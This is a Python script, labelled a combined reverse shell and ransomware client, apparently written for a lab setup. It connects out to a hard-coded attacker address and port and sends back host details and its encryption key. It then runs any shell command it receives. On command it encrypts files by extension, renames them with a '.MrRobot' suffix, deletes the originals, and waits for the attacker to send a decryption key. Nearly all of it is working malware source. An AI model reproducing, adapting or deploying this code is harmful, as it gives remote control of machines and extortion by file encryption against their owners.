#!/usr/bin/env python3
"""
COMBINED VICTIM: REVERSE SHELL + RANSOMWARE CLIENT
Run on: 198.168.100.5
Target: 198.168.100.4:4444
"""
import socket
import subprocess
import os
import sys
import platform
import time
import threading
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Util import Counter
from Crypto.Random import get_random_bytes

class CombinedVictim:
    def __init__(self, attacker_ip='198.168.100.4', attacker_port=4444):
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.socket = None
        self.running = False
        self.aes_key = None
        self.decryption_key = None

    def connect(self):
        """Connect to attacker with ransomware capabilities"""
        print("\n" + "=" * 60)
        print("COMBINED VICTIM: REVERSE SHELL + RANSOMWARE CLIENT")
        print("=" * 60)
        print(f"[*] Victim IP: 198.168.100.5")
        print(f"[*] Attacker: {self.attacker_ip}:{self.attacker_port}")
        print("[*] Attempting connection...")

        attempt = 1
        max_attempts = 5

        while attempt <= max_attempts and not self.running:
            print(f"\n[*] Attempt {attempt}/{max_attempts}")

            try:
                # Create socket
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(10)

                # Connect to attacker
                print(f"[*] Connecting to {self.attacker_ip}:{self.attacker_port}...")
                self.socket.connect((self.attacker_ip, self.attacker_port))
                self.socket.settimeout(None)
                self.running = True

                print(f"[+] Connected to attacker!")
                print(f"[+] Connection established at {time.ctime()}")

                # Receive welcome message
                welcome = self.socket.recv(4096).decode('ascii', errors='ignore')
                print(welcome)

                # Generate AES key for ransomware
                self.aes_key = get_random_bytes(32)
                print(f"[+] Generated AES key: {self.aes_key.hex()}")

                # Load public key and encrypt AES key
                if os.path.exists("public.pem"):
                    try:
                        with open("public.pem", "r") as f:
                            public_key_data = f.read()
                        public_key = RSA.import_key(public_key_data)
                        cipher = PKCS1_OAEP.new(public_key)
                        encrypted_aes_key = cipher.encrypt(self.aes_key)
                        
                        # Send encrypted AES key to attacker
                        self.socket.send(encrypted_aes_key)
                        print("[+] Sent encrypted AES key to attacker")

                        # Wait for confirmation
                        confirmation = self.socket.recv(4096).decode('ascii', errors='ignore')
                        print(f"[ATTACKER] {confirmation}")
                    except Exception as e:
                        print(f"[-] Error with RSA key: {e}")
                        self.socket.send(b"ERROR:RSA_KEY")
                else:
                    print("[!] public.pem not found - ransomware functions disabled")
                    self.socket.send(b"ERROR:NO_PUBLIC_KEY")

                # Send system info
                self.send_system_info()

                # Start command handler
                self.command_handler()

            except ConnectionRefusedError:
                print("[-] Connection refused - Attacker not listening")
            except socket.timeout:
                print("[-] Connection timeout")
            except Exception as e:
                print(f"[-] Connection error: {e}")

            if not self.running and attempt < max_attempts:
                print(f"[*] Retrying in 5 seconds...")
                time.sleep(5)
                attempt += 1

        if not self.running:
            print("\n[-] Failed to connect after all attempts")

    def send_system_info(self):
        """Send system information to attacker"""
        try:
            # Try to get username
            username = "Unknown"
            try:
                username = os.getlogin()
            except:
                pass

            system_info = f"""
[+] ==============================================
[+] COMBINED VICTIM SYSTEM INFORMATION
[+] ==============================================
[+] Hostname: {socket.gethostname()}
[+] IP Address: 198.168.100.5
[+] Username: {username}
[+] Platform: {platform.system()} {platform.release()}
[+] Processor: {platform.processor()}
[+] Python: {platform.python_version()}
[+] Current Directory: {os.getcwd()}
[+] Ransomware Key: {self.aes_key.hex() if self.aes_key else 'Not available'}
[+] Time: {time.ctime()}
[+] ==============================================\n
"""
            self.socket.send(system_info.encode())
        except Exception as e:
            print(f"[-] Error sending system info: {e}")

    def command_handler(self):
        """Main command handler for both reverse shell and ransomware"""
        print("[+] Ready to receive commands...")

        while self.running:
            try:
                # Receive command
                command_data = self.socket.recv(4096)
                if not command_data:
                    print("[-] Connection lost")
                    break

                # Check if it's binary data (decryption key) or text command
                is_text = True
                try:
                    command = command_data.decode('utf-8', errors='ignore').strip()
                    
                    if command.lower() == "exit":
                        print("[*] Exit command received")
                        self.socket.send(b"[+] Session terminated\n")
                        break

                    print(f"[*] Received command: {command}")
                    
                    # Handle ransomware commands
                    if command.lower() in ["en", "encrypt"]:
                        self.handle_encryption()
                        continue

                    if command.lower() in ["de", "decrypt"]:
                        self.handle_decryption()
                        continue

                    if command.lower() == "scan":
                        self.handle_scan()
                        continue

                    if command.lower() == "status":
                        self.handle_status()
                        continue

                    # Handle regular shell commands
                    output = self.execute_shell_command(command)
                    # Add end marker
                    output_with_marker = output + b"END_OF_OUTPUT"
                    self.socket.send(output_with_marker)

                except UnicodeDecodeError:
                    # This is likely binary data (decryption key)
                    is_text = False
                    
                if not is_text:
                    # Handle binary data (decryption key)
                    if len(command_data) == 32:  # 256-bit key
                        print(f"[+] Received decryption key: {command_data.hex()}")
                        self.decryption_key = command_data
                        response = f"[+] Decryption key received: {command_data.hex()}\n"
                        self.socket.send(response.encode())
                    elif command_data == b"NO_KEY":
                        self.socket.send(b"[-] No key provided by attacker\n")
                    else:
                        self.socket.send(b"[-] Invalid key received\n")

            except ConnectionResetError:
                print("[-] Connection reset by attacker")
                break
            except Exception as e:
                print(f"[-] Error: {e}")
                error_msg = f"[-] Error: {str(e)}\nEND_OF_OUTPUT"
                self.socket.send(error_msg.encode())

        self.cleanup()

    def handle_encryption(self):
        """Handle file encryption"""
        try:
            if not self.aes_key:
                self.socket.send(b"[-] No AES key available for encryption\nEND_OF_OUTPUT")
                return

            # Create test directory if it doesn't exist
            test_dir = "test"
            if not os.path.exists(test_dir):
                os.makedirs(test_dir)
                # Create some test files
                for i in range(3):
                    with open(os.path.join(test_dir, f"test_file_{i}.txt"), "w") as f:
                        f.write(f"This is test file {i} for encryption testing.\n")

            files = self.scan_target_files(test_dir)
            if files:
                encrypted_count = 0
                for file in files:
                    if self.encrypt_file(file, self.aes_key):
                        encrypted_count += 1
                
                response = f"[+] Encryption completed. {encrypted_count}/{len(files)} files encrypted\nEND_OF_OUTPUT"
                self.socket.send(response.encode())
            else:
                self.socket.send(b"[+] No target files found to encrypt\nEND_OF_OUTPUT")

        except Exception as e:
            error_msg = f"[-] Encryption error: {str(e)}\nEND_OF_OUTPUT"
            self.socket.send(error_msg.encode())

    def handle_decryption(self):
        """Handle file decryption"""
        try:
            if not hasattr(self, 'decryption_key') or self.decryption_key is None:
                self.socket.send(b"[-] Waiting for decryption key from attacker...\nEND_OF_OUTPUT")
                return

            encrypted_files = self.find_encrypted_files()
            if encrypted_files:
                decrypted_count = 0
                for file in encrypted_files:
                    if self.decrypt_file(file, self.decryption_key):
                        decrypted_count += 1
                
                response = f"[+] Decryption completed. {decrypted_count}/{len(encrypted_files)} files decrypted\nEND_OF_OUTPUT"
                self.socket.send(response.encode())
            else:
                self.socket.send(b"[+] No encrypted files found\nEND_OF_OUTPUT")

        except Exception as e:
            error_msg = f"[-] Decryption error: {str(e)}\nEND_OF_OUTPUT"
            self.socket.send(error_msg.encode())

    def handle_scan(self):
        """Handle file scanning"""
        try:
            # Create test directory if it doesn't exist
            test_dir = "test"
            if not os.path.exists(test_dir):
                os.makedirs(test_dir)
            
            files = self.scan_target_files(test_dir)
            encrypted_files = self.find_encrypted_files(test_dir)
            
            response = f"[+] Scan completed.\n"
            response += f"    Target files found: {len(files)}\n"
            response += f"    Encrypted files: {len(encrypted_files)}\n"
            response += f"    Current directory: {os.getcwd()}\n"
            response += "END_OF_OUTPUT"
            
            self.socket.send(response.encode())
        except Exception as e:
            error_msg = f"[-] Scan error: {str(e)}\nEND_OF_OUTPUT"
            self.socket.send(error_msg.encode())

    def handle_status(self):
        """Handle status check"""
        try:
            test_dir = "test"
            if not os.path.exists(test_dir):
                status = "[+] Status: test directory doesn't exist\nEND_OF_OUTPUT"
            else:
                encrypted_files = self.find_encrypted_files(test_dir)
                target_files = self.scan_target_files(test_dir)
                status = f"[+] Status:\n"
                status += f"    Files encrypted: {len(encrypted_files)}\n"
                status += f"    Total target files: {len(target_files)}\n"
                status += f"    Encryption key: {'Available' if self.aes_key else 'Not available'}\n"
                status += f"    Decryption key: {'Available' if self.decryption_key else 'Not available'}\n"
                status += "END_OF_OUTPUT"
            
            self.socket.send(status.encode())
        except Exception as e:
            error_msg = f"[-] Status error: {str(e)}\nEND_OF_OUTPUT"
            self.socket.send(error_msg.encode())

    def encrypt_file(self, file_path, key):
        """Encrypt a single file"""
        try:
            # Read file content
            with open(file_path, 'rb') as f:
                data = f.read()
            
            if not data:
                return False

            # Generate nonce and create cipher
            nonce = get_random_bytes(8)
            counter = Counter.new(64, prefix=nonce)
            cipher = AES.new(key, AES.MODE_CTR, counter=counter)
            
            # Encrypt data
            encrypted_data = cipher.encrypt(data)
            
            # Write encrypted data
            encrypted_file = file_path + ".MrRobot"
            with open(encrypted_file, 'wb') as f:
                f.write(encrypted_data)
            
            # Save nonce
            nonce_file = file_path + '.nonce'
            with open(nonce_file, 'wb') as nf:
                nf.write(nonce)
            
            # Remove original file
            os.remove(file_path)
            
            print(f"[+] Encrypted: {file_path}")
            return True

        except Exception as e:
            print(f"[!] Encryption error for {file_path}: {e}")
            return False

    def decrypt_file(self, file_path, key):
        """Decrypt a single file"""
        try:
            # Check if nonce file exists
            nonce_file = file_path.replace(".MrRobot", "") + '.nonce'
            
            if not os.path.exists(nonce_file):
                print(f"[!] Nonce file not found for {file_path}")
                return False

            # Read nonce
            with open(nonce_file, 'rb') as nf:
                nonce = nf.read()

            # Read encrypted data
            with open(file_path, 'rb') as f:
                encrypted_data = f.read()

            # Create cipher and decrypt
            counter = Counter.new(64, prefix=nonce)
            cipher = AES.new(key, AES.MODE_CTR, counter=counter)
            decrypted_data = cipher.decrypt(encrypted_data)

            # Write decrypted data
            original_file = file_path.replace(".MrRobot", "")
            with open(original_file, 'wb') as f:
                f.write(decrypted_data)

            # Cleanup
            os.remove(file_path)
            os.remove(nonce_file)
            
            print(f"[+] Decrypted: {file_path}")
            return True

        except Exception as e:
            print(f"[!] Decryption error for {file_path}: {e}")
            return False

    def scan_target_files(self, directory="test"):
        """Scan for target files"""
        extensions = [
            ".txt", ".py", ".c", ".cpp", ".h", ".java", ".js", 
            ".html", ".css", ".php", ".pdf", ".doc", ".docx",
            ".xls", ".xlsx", ".jpg", ".jpeg", ".png", ".mp4",
            ".mp3", ".zip", ".rar"
        ]

        found_files = []
        if not os.path.exists(directory):
            return found_files

        try:
            for root, dirs, files in os.walk(directory):
                for file in files:
                    # Skip already encrypted files
                    if file.endswith(".MrRobot"):
                        continue
                    
                    # Check extension
                    for ext in extensions:
                        if file.lower().endswith(ext):
                            full_path = os.path.join(root, file)
                            found_files.append(full_path)
                            break
        except Exception as e:
            print(f"[!] Scan error: {e}")

        return found_files

    def find_encrypted_files(self, directory="test"):
        """Find encrypted files"""
        encrypted_files = []
        if not os.path.exists(directory):
            return encrypted_files

        try:
            for root, dirs, files in os.walk(directory):
                for file in files:
                    if file.endswith(".MrRobot"):
                        full_path = os.path.join(root, file)
                        encrypted_files.append(full_path)
        except Exception as e:
            print(f"[!] Error finding encrypted files: {e}")

        return encrypted_files

    def execute_shell_command(self, command):
        """Execute shell command"""
        try:
            # Handle special commands
            if command.lower() == "clear":
                return b"[+] Screen cleared on victim side\n"

            if command.lower().startswith("cd "):
                new_dir = command[3:].strip()
                try:
                    if not new_dir:
                        # Show current directory
                        return f"[+] Current directory: {os.getcwd()}\n".encode()
                    
                    os.chdir(new_dir)
                    return f"[+] Changed directory to: {os.getcwd()}\n".encode()
                except Exception as e:
                    return f"[-] cd error: {str(e)}\n".encode()

            # Execute command based on platform
            if platform.system() == "Windows":
                shell_cmd = ["cmd", "/c"] + command.split()
            else:
                shell_cmd = ["/bin/sh", "-c", command]

            # Execute command
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )

            stdout, stderr = process.communicate(timeout=30)
            
            if stderr and not stdout:
                output = stderr
            elif stdout:
                output = stdout
            else:
                output = b"[+] Command executed successfully (no output)\n"

            # Add prompt for next command
            prompt = f"\n[{os.getcwd()}]> "
            return output + prompt.encode()

        except subprocess.TimeoutExpired:
            process.kill()
            return b"[-] Command timed out (30 seconds)\n"
        except Exception as e:
            return f"[-] Command error: {str(e)}\n".encode()

    def cleanup(self):
        """Cleanup resources"""
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        print("[*] Connection closed")
        print("[*] Combined victim stopped")


def main():
    """Main function"""
    # Check if required module is installed
    try:
        from Crypto.PublicKey import RSA
        print("[+] PyCryptodome module is installed")
    except ImportError:
        print("[-] ERROR: PyCryptodome module not installed!")
        print("[*] Install it using: pip install pycryptodome")
        sys.exit(1)
    
    # Check for public key
    if not os.path.exists("public.pem"):
        print("[!] WARNING: public.pem not found in current directory")
        print("[*] Make sure to copy public.pem from the attacker machine")
        print("[*] Without it, ransomware functions won't work")
    
    try:
        ATTACKER_IP = "198.168.100.4"
        ATTACKER_PORT = 4444

        victim = CombinedVictim(
            attacker_ip=ATTACKER_IP,
            attacker_port=ATTACKER_PORT
        )
        victim.connect()
    except KeyboardInterrupt:
        print("\n[*] Stopped by user")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Fatal error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()











